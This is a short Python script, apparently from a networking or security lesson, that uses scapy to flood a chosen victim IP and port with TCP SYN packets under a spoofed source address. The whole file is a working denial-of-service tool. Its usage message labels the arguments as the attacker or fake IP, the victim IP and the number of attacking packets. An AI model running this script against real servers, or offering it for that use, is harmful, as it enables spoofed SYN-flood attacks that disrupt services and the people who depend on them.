import sys, socket
from scapy.all import *
errorMessage= """
Not correct number of arguments, follow the below example:
- sudo python ./dos.py 192.168.1.2 192.168.1.200 80 10
    - Notice:
        - sudo python ./dos.py is to run the file.
        - 192.168.1.2 is the attacker or fake IP.
        - 192.168.1.200 is victim IP.
        - 10 number of attacking packets (small number for quick testing). 
"""
if len(sys.argv) != 5:
	# This message will be printed if the command arguments are less than five
	print (errorMessage)
	# This will stop running the code
	sys.exit(1)
# sys.argv[0] is the command itself ./dos.py, 
attackerIP = sys.argv[1]
victimServerIP = sys.argv[2]
# Convert sys.argv[3] from string into integer value
victimServerPort = int(sys.argv[3])
# Convert sys.argv[4] from string into integer value
numberOfPackets = int(sys.argv[4])
# The loop will be up to sys.argv[4] which is number of attacking packets
for i in range(numberOfPackets):
	ipHeader = IP(src = attackerIP, dst = victimServerIP)
	tcpHeader = TCP(flags = "S", sport = RandShort(), dport = victimServerPort)
	packet = ipHeader / tcpHeader
	try:
		send(packet)
	except Exception as e:
		print (e)
